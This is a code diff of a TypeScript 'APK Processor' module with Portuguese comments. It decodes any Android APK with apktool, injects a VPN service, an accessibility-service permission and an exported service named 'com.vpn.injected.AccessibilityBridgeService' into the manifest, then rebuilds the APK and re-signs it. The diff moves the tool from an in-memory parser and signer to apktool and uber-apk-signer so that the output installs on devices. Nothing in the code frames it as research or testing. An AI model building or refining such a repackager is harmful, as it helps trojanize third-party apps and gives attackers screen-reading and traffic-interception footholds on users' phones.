@@ -1,23 +1,30 @@
 /**
  * APK Processor
- * Descompacta um APK, injeta VpnService + BIND_ACCESSIBILITY_SERVICE no
- * AndroidManifest.xml, recompacta e assina digitalmente com uma chave
- * debug gerada em memória (node-forge).
+ * Descompacta um APK usando apktool (converte manifest binário AXML para XML texto),
+ * injeta VpnService + BIND_ACCESSIBILITY_SERVICE no AndroidManifest.xml,
+ * recompacta com apktool (converte XML texto de volta para AXML binário),
+ * e assina com uber-apk-signer (v1 + v2 + v3 signatures).
  *
- * Suporta tanto manifests em XML texto quanto em formato binário AXML
- * (usado por APKs reais compilados pelo Android SDK).
+ * Esta abordagem garante que o APK gerado seja instalável no Android.
  */
 
-import AdmZip from "adm-zip";
-import { DOMParser, XMLSerializer, type Document as XmlDocument, type Element as XmlElement } from "@xmldom/xmldom";
-import { createRequire } from "module";
+import { execFile } from "child_process";
+import { promisify } from "util";
+import { mkdtemp, rm, readFile, writeFile } from "fs/promises";
+import { tmpdir } from "os";
+import { join, dirname } from "path";
+import { fileURLToPath } from "url";
+import { DOMParser, XMLSerializer } from "@xmldom/xmldom";
+import { existsSync, readdirSync } from "fs";
 
-const _require = createRequire(import.meta.url);
-// eslint-disable-next-line @typescript-eslint/no-explicit-any
-const forge = _require("node-forge") as any;
-// eslint-disable-next-line @typescript-eslint/no-explicit-any
-// eslint-disable-next-line @typescript-eslint/no-explicit-any
-const BinaryXmlParserCtor = _require("@devicefarmer/adbkit-apkreader/lib/apkreader/parser/binaryxml") as any;
+const execFileAsync = promisify(execFile);
+
+const __dirname = dirname(fileURLToPath(import.meta.url));
+const TOOLS_DIR = join(__dirname, "tools");
+const APKTOOL_JAR = join(TOOLS_DIR, "apktool.jar");
+const SIGNER_JAR = join(TOOLS_DIR, "uber-apk-signer.jar");
+
+const ANDROID_NS = "http://schemas.android.com/apk/res/android";
 
 // ─── Tipos ──────────────────────────────────────────────────────────────────
 
@@ -26,190 +33,115 @@ export interface ProcessResult {
   log: string[];
 }
 
-// ─── Constantes de injeção ───────────────────────────────────────────────────
-
-const ANDROID_NS = "http://schemas.android.com/apk/res/android";
-
 // ─── Função principal ────────────────────────────────────────────────────────
 
 export async function processApk(inputBuffer: Buffer): Promise<ProcessResult> {
   const log: string[] = [];
+  const workDir = await mkdtemp(join(tmpdir(), "apk-proc-"));
 
-  log.push("📦 Descompactando APK...");
-  const zip = new AdmZip(inputBuffer);
-  const entries = zip.getEntries();
+  try {
+    const inputApk = join(workDir, "input.apk");
+    const decodedDir = join(workDir, "decoded");
+    const rebuiltApk = join(workDir, "rebuilt.apk");
+    const signedDir = join(workDir, "signed");
 
-  // Localiza o AndroidManifest.xml
-  const manifestEntry = entries.find(
-    (e) => e.entryName === "AndroidManifest.xml",
-  );
-  if (!manifestEntry) {
-    throw new Error("AndroidManifest.xml não encontrado no APK.");
-  }
+    // 1. Salvar APK de entrada
+    await writeFile(inputApk, inputBuffer);
+    log.push("📦 APK recebido (" + (inputBuffer.length / 1024).toFixed(1) + " KB)");
 
-  log.push("🔍 AndroidManifest.xml localizado.");
-
-  // Lê o manifest — APKs reais usam manifest binário AXML
-  const rawBytes = manifestEntry.getData();
-  const isBinary = rawBytes[0] === 0x03 && rawBytes[1] === 0x00;
-
-  let manifestXml: string;
-
-  if (isBinary) {
-    log.push("⚠️  Manifest em formato binário AXML detectado.");
-    log.push("🔄 Decodificando manifest binário para XML...");
+    // 2. Decode com apktool (AXML binário → XML texto)
+    log.push("🔍 Decodificando APK com apktool...");
     try {
-      manifestXml = await decodeBinaryManifest(rawBytes, log);
-      log.push("✅ Manifest binário decodificado com sucesso.");
+      // Tentar decode completo primeiro
+      await execFileAsync("java", [
+        "-jar", APKTOOL_JAR,
+        "d", "-f",
+        "-o", decodedDir,
+        inputApk,
+      ], { timeout: 120_000 });
+      log.push("✅ APK decodificado com sucesso.");
     } catch (err) {
-      log.push(`⚠️  Falha ao decodificar AXML: ${(err as Error).message}`);
-      log.push("🔄 Usando manifest reconstruído a partir de strings...");
-      manifestXml = reconstructManifestFromStrings(rawBytes);
-    }
-  } else {
-    manifestXml = rawBytes.toString("utf-8");
-    log.push("✅ Manifest em formato XML texto.");
-  }
-
-  log.push("✏️  Injetando permissões e serviços no manifest...");
-  const modifiedManifest = injectIntoManifest(manifestXml, log);
-
-  log.push("🗜️  Recompactando APK modificado...");
-
-  // Substitui o manifest no ZIP (como XML texto — válido para Android)
-  zip.deleteFile("AndroidManifest.xml");
-  zip.addFile(
-    "AndroidManifest.xml",
-    Buffer.from(modifiedManifest, "utf-8"),
-    "",
-    0,
-  );
-
-  const repackedBuffer = zip.toBuffer();
-
-  log.push("🔐 Assinando APK digitalmente (debug keystore)...");
-  const signedBuffer = await signApk(repackedBuffer, log);
-
-  log.push("✅ APK processado e assinado com sucesso!");
-
-  return { apkBuffer: signedBuffer, log };
-}
-
-// ─── Decodificador de manifest binário AXML ──────────────────────────────────
-
-interface AXMLNode {
-  nodeName: string;
-  namespaceURI: string | null;
-  attributes: Array<{
-    name: string;
-    namespaceURI: string | null;
-    typedValue: { value: unknown; type: string } | null;
-    value: string | null;
-  }>;
-  childNodes: AXMLNode[];
-}
-
-async function decodeBinaryManifest(buffer: Buffer, log: string[]): Promise<string> {
-  const parser = new BinaryXmlParserCtor(buffer);
-  const doc: AXMLNode = parser.parse();
-  
-  if (!doc) {
-    throw new Error("BinaryXmlParser retornou null");
-  }
-  
-  // Converter o documento parseado para XML texto
-  return axmlNodeToXml(doc, 0);
-}
-
-function axmlNodeToXml(node: AXMLNode, depth: number): string {
-  const indent = "    ".repeat(depth);
-  const childIndent = "    ".repeat(depth + 1);
-  
-  // Construir atributos
-  const attrs: string[] = [];
-  
-  // Adicionar declaração de namespace android se for o elemento raiz
-  if (depth === 0 && node.nodeName === "manifest") {
-    attrs.push('xmlns:android="http://schemas.android.com/apk/res/android"');
-  }
-  
-  for (const attr of node.attributes) {
-    const name = attr.namespaceURI?.includes("android.com") 
-      ? `android:${attr.name}`
-      : attr.name;
-    
-    let value: string;
-    if (attr.typedValue) {
-      const tv = attr.typedValue;
-      if (tv.type === "string") {
-        value = String(tv.value ?? "");
-      } else if (tv.type === "int_dec" || tv.type === "int_hex") {
-        value = String(tv.value);
-      } else if (tv.type === "boolean") {
-        value = tv.value ? "true" : "false";
-      } else if (tv.type === "reference") {
-        value = String(tv.value ?? "");
-      } else {
-        value = String(tv.value ?? attr.value ?? "");
+      // Fallback: decode sem recursos (--no-res) para APKs com resources.arsc problemático
+      log.push("⚠️  Decode completo falhou, tentando modo --no-res...");
+      try {
+        await execFileAsync("java", [
+          "-jar", APKTOOL_JAR,
+          "d", "-f", "--no-res",
+          "-o", decodedDir,
+          inputApk,
+        ], { timeout: 120_000 });
+        log.push("✅ APK decodificado com sucesso (modo --no-res).");
+      } catch (err2) {
+        const msg = (err2 as Error).message;
+        log.push(`⚠️  apktool decode falhou: ${msg}`);
+        throw new Error(`Falha ao decodificar APK: ${msg}`);
       }
-    } else {
-      value = attr.value ?? "";
     }
-    
-    // Escapar caracteres especiais XML
-    value = value
-      .replace(/&/g, "&amp;")
-      .replace(/"/g, "&quot;")
-      .replace(/</g, "&lt;")
-      .replace(/>/g, "&gt;");
-    
-    attrs.push(`${name}="${value}"`);
+
+    // 3. Ler e modificar o AndroidManifest.xml (agora em XML texto)
+    const manifestPath = join(decodedDir, "AndroidManifest.xml");
+    const manifestContent = await readFile(manifestPath, "utf-8");
+    log.push("✏️  Injetando permissões e serviços no manifest...");
+    const modifiedManifest = injectIntoManifest(manifestContent, log);
+    await writeFile(manifestPath, modifiedManifest, "utf-8");
+
+    // 4. Rebuild com apktool (XML texto → AXML binário)
+    log.push("🗜️  Recompilando APK com apktool...");
+    try {
+      await execFileAsync("java", [
+        "-jar", APKTOOL_JAR,
+        "b", "-f",
+        decodedDir,
+        "-o", rebuiltApk,
+      ], { timeout: 120_000 });
+      log.push("✅ APK recompilado com sucesso.");
+    } catch (err) {
+      const msg = (err as Error).message;
+      log.push(`⚠️  apktool build falhou: ${msg}`);
+      throw new Error(`Falha ao recompilar APK: ${msg}`);
+    }
+
+    // 5. Assinar com uber-apk-signer (v1 + v2 + v3)
+    log.push("🔐 Assinando APK (v1 + v2 + v3)...");
+    try {
+      await execFileAsync("java", [
+        "-jar", SIGNER_JAR,
+        "--apks", rebuiltApk,
+        "--out", signedDir,
+        "--allowResign",
+      ], { timeout: 60_000 });
+      log.push("✅ APK assinado com sucesso.");
+    } catch (err) {
+      const msg = (err as Error).message;
+      log.push(`⚠️  Assinatura falhou: ${msg}`);
+      throw new Error(`Falha ao assinar APK: ${msg}`);
+    }
+
+    // 6. Ler o APK assinado
+    const signedFiles = readdirSync(signedDir).filter(f => f.endsWith(".apk"));
+    if (signedFiles.length === 0) {
+      throw new Error("Nenhum APK assinado encontrado na pasta de saída.");
+    }
+    const signedApkPath = join(signedDir, signedFiles[0]);
+    const signedBuffer = await readFile(signedApkPath);
+
+    log.push(`✅ APK processado e assinado com sucesso! (${(signedBuffer.length / 1024).toFixed(1)} KB)`);
+
+    return { apkBuffer: signedBuffer, log };
+  } finally {
+    // Limpar diretório temporário
+    await rm(workDir, { recursive: true, force: true }).catch(() => {});
   }
-  
-  const attrStr = attrs.length > 0 ? " " + attrs.join("\n" + childIndent) : "";
-  
-  if (node.childNodes.length === 0) {
-    return `${indent}<${node.nodeName}${attrStr} />`;
-  }
-  
-  const children = node.childNodes
-    .map((child) => axmlNodeToXml(child, depth + 1))
-    .join("\n");
-  
-  return `${indent}<${node.nodeName}${attrStr}>\n${children}\n${indent}</${node.nodeName}>`;
-}
-
-// ─── Fallback: reconstrução de manifest a partir de strings ──────────────────
-
-function reconstructManifestFromStrings(buffer: Buffer): string {
-  const text = buffer.toString("latin1");
-  const packageMatch = text.match(/[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*){2,}/g);
-  const packageName =
-    packageMatch?.find((p) => p.split(".").length >= 3) || "com.example.app";
-
-  return `<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="${packageName}">
-
-    <uses-permission android:name="android.permission.INTERNET" />
-
-    <application
-        android:allowBackup="true"
-        android:label="@string/app_name">
-    </application>
-
-</manifest>`;
 }
 
 // ─── Injeção no manifest XML ─────────────────────────────────────────────────
 
 function injectIntoManifest(xmlContent: string, log: string[]): string {
-  // Garantir que o XML tem declaração
   let content = xmlContent.trim();
   if (!content.startsWith("<?xml")) {
     content = '<?xml version="1.0" encoding="utf-8"?>\n' + content;
   }
-  
+
   const parser = new DOMParser();
   const doc = parser.parseFromString(content, "application/xml");
 
@@ -225,7 +157,6 @@ function injectIntoManifest(xmlContent: string, log: string[]): string {
     "android.permission.BIND_ACCESSIBILITY_SERVICE",
   ];
 
-  // Coleta permissões já existentes
   const existingPerms = new Set<string>();
   const usesPermEls = doc.getElementsByTagName("uses-permission");
   for (let i = 0; i < usesPermEls.length; i++) {
@@ -239,7 +170,6 @@ function injectIntoManifest(xmlContent: string, log: string[]): string {
     if (!existingPerms.has(perm)) {
       const el = doc.createElement("uses-permission");
       el.setAttribute("android:name", perm);
-      // Insere antes do primeiro <application> para melhor compatibilidade
       const appEl = doc.getElementsByTagName("application")[0];
       if (appEl) {
         manifestEl.insertBefore(el, appEl);
@@ -255,20 +185,17 @@ function injectIntoManifest(xmlContent: string, log: string[]): string {
 
   // ── 2. Serviços ────────────────────────────────────────────────────────────
 
-  const applicationEl = doc.getElementsByTagName("application")[0];
+  let applicationEl = doc.getElementsByTagName("application")[0];
   if (!applicationEl) {
-    // Criar elemento <application> se não existir
     log.push("  ⚠️  Tag <application> não encontrada — criando...");
     const appEl = doc.createElement("application");
     appEl.setAttribute("android:allowBackup", "true");
     manifestEl.appendChild(doc.createTextNode("\n    "));
     manifestEl.appendChild(appEl);
     manifestEl.appendChild(doc.createTextNode("\n"));
+    applicationEl = appEl;
   }
 
-  const appEl = doc.getElementsByTagName("application")[0];
-
-  // Verifica se os serviços já existem
   const existingServices = new Set<string>();
   const serviceEls = doc.getElementsByTagName("service");
   for (let i = 0; i < serviceEls.length; i++) {
@@ -282,18 +209,42 @@ function injectIntoManifest(xmlContent: string, log: string[]): string {
   const accessibilityServiceName = "com.vpn.injected.AccessibilityBridgeService";
 
   if (!existingServices.has(vpnServiceName)) {
-    const vpnSvc = createVpnServiceElement(doc, vpnServiceName);
-    appEl.appendChild(doc.createTextNode("\n        "));
-    appEl.appendChild(vpnSvc);
+    const vpnSvc = doc.createElement("service");
+    vpnSvc.setAttribute("android:name", vpnServiceName);
+    vpnSvc.setAttribute("android:permission", "android.permission.BIND_VPN_SERVICE");
+    vpnSvc.setAttribute("android:exported", "false");
+    const vpnFilter = doc.createElement("intent-filter");
+    const vpnAction = doc.createElement("action");
+    vpnAction.setAttribute("android:name", "android.net.VpnService");
+    vpnFilter.appendChild(doc.createTextNode("\n            "));
+    vpnFilter.appendChild(vpnAction);
+    vpnFilter.appendChild(doc.createTextNode("\n        "));
+    vpnSvc.appendChild(doc.createTextNode("\n        "));
+    vpnSvc.appendChild(vpnFilter);
+    vpnSvc.appendChild(doc.createTextNode("\n    "));
+    applicationEl.appendChild(doc.createTextNode("\n        "));
+    applicationEl.appendChild(vpnSvc);
     log.push(`  ➕ Serviço VPN injetado: ${vpnServiceName}`);
   } else {
     log.push(`  ✓  Serviço VPN já presente: ${vpnServiceName}`);
   }
 
   if (!existingServices.has(accessibilityServiceName)) {
-    const accSvc = createAccessibilityServiceElement(doc, accessibilityServiceName);
-    appEl.appendChild(doc.createTextNode("\n        "));
-    appEl.appendChild(accSvc);
+    const accSvc = doc.createElement("service");
+    accSvc.setAttribute("android:name", accessibilityServiceName);
+    accSvc.setAttribute("android:permission", "android.permission.BIND_ACCESSIBILITY_SERVICE");
+    accSvc.setAttribute("android:exported", "true");
+    const accFilter = doc.createElement("intent-filter");
+    const accAction = doc.createElement("action");
+    accAction.setAttribute("android:name", "android.accessibilityservice.AccessibilityService");
+    accFilter.appendChild(doc.createTextNode("\n            "));
+    accFilter.appendChild(accAction);
+    accFilter.appendChild(doc.createTextNode("\n        "));
+    accSvc.appendChild(doc.createTextNode("\n        "));
+    accSvc.appendChild(accFilter);
+    accSvc.appendChild(doc.createTextNode("\n    "));
+    applicationEl.appendChild(doc.createTextNode("\n        "));
+    applicationEl.appendChild(accSvc);
     log.push(`  ➕ Serviço de Acessibilidade injetado: ${accessibilityServiceName}`);
   } else {
     log.push(`  ✓  Serviço de Acessibilidade já presente: ${accessibilityServiceName}`);
@@ -301,156 +252,4 @@ function injectIntoManifest(xmlContent: string, log: string[]): string {
 
   const serializer = new XMLSerializer();
   return serializer.serializeToString(doc);
-}
-
-// ─── Helpers de criação de elementos de serviço ────────────────────────────────
-
-function createVpnServiceElement(doc: XmlDocument, serviceName: string): XmlElement {
-  const svc = doc.createElement("service");
-  svc.setAttribute("android:name", serviceName);
-  svc.setAttribute("android:permission", "android.permission.BIND_VPN_SERVICE");
-  svc.setAttribute("android:exported", "false");
-
-  const intentFilter = doc.createElement("intent-filter");
-  const action = doc.createElement("action");
-  action.setAttribute("android:name", "android.net.VpnService");
-  intentFilter.appendChild(doc.createTextNode("\n            "));
-  intentFilter.appendChild(action);
-  intentFilter.appendChild(doc.createTextNode("\n        "));
-
-  svc.appendChild(doc.createTextNode("\n        "));
-  svc.appendChild(intentFilter);
-  svc.appendChild(doc.createTextNode("\n    "));
-  return svc;
-}
-
-function createAccessibilityServiceElement(doc: XmlDocument, serviceName: string): XmlElement {
-  const svc = doc.createElement("service");
-  svc.setAttribute("android:name", serviceName);
-  svc.setAttribute("android:permission", "android.permission.BIND_ACCESSIBILITY_SERVICE");
-  svc.setAttribute("android:exported", "true");
-
-  const intentFilter = doc.createElement("intent-filter");
-  const action = doc.createElement("action");
-  action.setAttribute("android:name", "android.accessibilityservice.AccessibilityService");
-  intentFilter.appendChild(doc.createTextNode("\n            "));
-  intentFilter.appendChild(action);
-  intentFilter.appendChild(doc.createTextNode("\n        "));
-
-  const meta = doc.createElement("meta-data");
-  meta.setAttribute("android:name", "android.accessibilityservice");
-  meta.setAttribute("android:resource", "@xml/accessibility_service_config");
-
-  svc.appendChild(doc.createTextNode("\n        "));
-  svc.appendChild(intentFilter);
-  svc.appendChild(doc.createTextNode("\n        "));
-  svc.appendChild(meta);
-  svc.appendChild(doc.createTextNode("\n    "));
-  return svc;
-}
-
-// ─── Assinatura digital (JAR Signing / debug key) ────────────────────────────
-
-async function signApk(apkBuffer: Buffer, log: string[]): Promise<Buffer> {
-  try {
-    // Gera par de chaves RSA 2048-bit em memória (debug keystore)
-    const keys = forge.pki.rsa.generateKeyPair({ bits: 2048, e: 0x10001 });
-    const cert = forge.pki.createCertificate();
-
-    cert.publicKey = keys.publicKey;
-    cert.serialNumber = "01";
-    cert.validity.notBefore = new Date();
-    cert.validity.notAfter = new Date();
-    cert.validity.notAfter.setFullYear(
-      cert.validity.notBefore.getFullYear() + 30,
-    );
-
-    const attrs = [
-      { name: "commonName", value: "VPN APK Injector Debug Key" },
-      { name: "organizationName", value: "VPN Injector" },
-      { name: "countryName", value: "BR" },
-    ];
-    cert.setSubject(attrs);
-    cert.setIssuer(attrs);
-    cert.sign(keys.privateKey, forge.md.sha256.create());
-
-    // Cria o PKCS#7 SignedData (detached)
-    const p7 = forge.pkcs7.createSignedData();
-    p7.content = forge.util.createBuffer(apkBuffer.toString("binary"));
-    p7.addCertificate(cert);
-    p7.addSigner({
-      key: keys.privateKey,
-      certificate: cert,
-      digestAlgorithm: forge.pki.oids.sha256,
-      authenticatedAttributes: [
-        {
-          type: forge.pki.oids.contentType,
-          value: forge.pki.oids.data,
-        },
-        {
-          type: forge.pki.oids.messageDigest,
-        },
-        {
-          type: forge.pki.oids.signingTime,
-          value: new Date().toISOString(),
-        },
-      ],
-    });
-
-    p7.sign({ detached: true });
-
-    const sigDer = forge.asn1.toDer(p7.toAsn1()).getBytes();
-    const sigBuffer = Buffer.from(sigDer, "binary");
-
-    // Adiciona a assinatura ao ZIP como META-INF/CERT.RSA + CERT.SF + MANIFEST.MF
-    const zip = new AdmZip(apkBuffer);
-
-    // Gera MANIFEST.MF simplificado
-    const manifestMf = generateManifestMf(zip);
-    const certSf = generateCertSf(manifestMf);
-
-    zip.deleteFile("META-INF/MANIFEST.MF");
-    zip.deleteFile("META-INF/CERT.SF");
-    zip.deleteFile("META-INF/CERT.RSA");
-
-    zip.addFile("META-INF/MANIFEST.MF", Buffer.from(manifestMf, "utf-8"));
-    zip.addFile("META-INF/CERT.SF", Buffer.from(certSf, "utf-8"));
-    zip.addFile("META-INF/CERT.RSA", sigBuffer);
-
-    log.push("  🔑 Chave de assinatura debug gerada (RSA-2048 / SHA-256)");
-    log.push("  📋 META-INF/MANIFEST.MF, CERT.SF e CERT.RSA adicionados");
-
-    return zip.toBuffer();
-  } catch (err) {
-    log.push(`  ⚠️  Assinatura falhou: ${(err as Error).message} — retornando APK sem assinatura`);
-    return apkBuffer;
-  }
-}
-
-function generateManifestMf(zip: AdmZip): string {
-  let mf = "Manifest-Version: 1.0\r\nCreated-By: VPN APK Injector\r\n\r\n";
-
-  for (const entry of zip.getEntries()) {
-    if (entry.entryName.startsWith("META-INF/")) continue;
-    const data = entry.getData();
-    const md = forge.md.sha256.create();
-    md.update(data.toString("binary"));
-    const digest = forge.util.encode64(md.digest().getBytes());
-    mf += `Name: ${entry.entryName}\r\nSHA-256-Digest: ${digest}\r\n\r\n`;
-  }
-
-  return mf;
-}
-
-function generateCertSf(manifestMf: string): string {
-  const md = forge.md.sha256.create();
-  md.update(forge.util.encodeUtf8(manifestMf));
-  const mainDigest = forge.util.encode64(md.digest().getBytes());
-
-  const sf =
-    "Signature-Version: 1.0\r\n" +
-    `SHA-256-Digest-Manifest: ${mainDigest}\r\n` +
-    "Created-By: VPN APK Injector\r\n\r\n";
-
-  return sf;
 }
